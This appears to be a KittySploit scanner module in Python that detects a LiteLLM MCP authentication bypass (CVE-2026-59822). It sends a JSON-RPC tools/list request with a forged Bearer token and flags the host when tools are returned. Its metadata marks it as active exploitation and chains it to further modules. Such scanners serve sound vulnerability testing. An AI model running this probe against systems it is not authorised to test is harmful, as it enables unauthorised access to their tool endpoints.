#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Detect LiteLLM CVE-2026-59822 MCP Streamable HTTP OAuth2 fallback auth bypass."""

import secrets

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        "name": "LiteLLM CVE-2026-59822 MCP Auth Bypass Detect",
        "description": (
            "Detects CVE-2026-59822 in LiteLLM proxy before 1.84.0: failed LiteLLM key "
            "validation on the MCP Streamable HTTP endpoint falls back to an empty "
            "UserAPIKeyAuth object when a fabricated Authorization Bearer is supplied."
        ),
        "author": ["KittySploit Team"],
        "severity": "high",
        "cve": ["CVE-2026-59822"],
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2026-59822",
            "https://github.com/advisories/GHSA-7488-6r32-c95q",
        ],
        "tags": [
            "web",
            "scanner",
            "litellm",
            "mcp",
            "auth-bypass",
            "llm",
            "cve-2026-59822",
            "vuln",
        ],
        "agent": {
            "risk": "active",
            "effects": ["network_probe", "active_exploitation"],
            "expected_requests": 4,
            "reversible": True,
            "approval_required": True,
            "produces": ["tech_hints", "risk_signals", "exploit_paths"],
            "cost": 1.2,
            "noise": 0.35,
            "value": 1.0,
            "requires": {
                "tech_hints_any": ["litellm", "openai"],
                "endpoint_pattern_any": ["/mcp"],
            },
            "chain": {
                "produces_capabilities": [
                    {"capability": "auth_bypass", "from_detail": "MCP OAuth fallback"},
                ],
                "suggested_followups": [
                    "scanner/http/litellm_cve_2026_42208_detect",
                ],
            },
        },
    }

    port = OptPort(4000, "LiteLLM proxy HTTP port", True)
    ssl = OptBool(False, "Use HTTPS", True, advanced=True)
    mcp_path = OptString("/mcp", "MCP Streamable HTTP endpoint", False, advanced=True)

    def _path(self) -> str:
        base = (self.path or "/").rstrip("/")
        suffix = str(self.mcp_path or "/mcp")
        if not suffix.startswith("/"):
            suffix = f"/{suffix}"
        return f"{base}{suffix}" if base else suffix

    def _mcp_request(self, bearer: str | None):
        headers = {"Accept": "application/json", "Content-Type": "application/json"}
        if bearer is not None:
            headers["Authorization"] = f"Bearer {bearer}"
        body = {"jsonrpc": "2.0", "id": 1, "method": "tools/list", "params": {}}
        return self.http_request(
            method="POST",
            path=self._path(),
            headers=headers,
            json=body,
            allow_redirects=False,
        )

    @staticmethod
    def _looks_like_tools(body: str) -> bool:
        lowered = (body or "").lower()
        return "tools" in lowered and ("result" in lowered or "name" in lowered)

    def run(self):
        health = self.http_request(method="GET", path="/health", allow_redirects=False)
        root = self.http_request(method="GET", path="/", allow_redirects=False)
        banner = ((health.text if health else "") + (root.text if root else "")).lower()
        if "litellm" not in banner and "swagger" not in banner:
            chat = self.http_request(method="GET", path="/docs", allow_redirects=False)
            banner = (chat.text or "").lower()
            if "litellm" not in banner:
                return False

        marker = f"kittysploit-{secrets.token_hex(6)}"
        no_auth = self._mcp_request(None)
        forged = self._mcp_request(marker)
        if not forged:
            return False

        forged_code = int(forged.status_code or 0)
        forged_body = forged.text or ""
        no_auth_code = int(no_auth.status_code or 0) if no_auth else 0
        no_auth_body = (no_auth.text or "") if no_auth else ""

        if forged_code in (200, 202) and self._looks_like_tools(forged_body):
            if no_auth_code in (401, 403) or "authentication" in no_auth_body.lower():
                self.set_info(
                    severity="high",
                    cve="CVE-2026-59822",
                    reason="MCP tools/list succeeds with fabricated Bearer but not without auth",
                    path=self._path(),
                )
                return True
        if forged_code in (200, 202) and "unauthorized" not in forged_body.lower():
            if self._looks_like_tools(forged_body):
                self.set_info(
                    severity="high",
                    cve="CVE-2026-59822",
                    reason="MCP endpoint accepted fabricated Bearer token",
                    path=self._path(),
                )
                return True
        return False
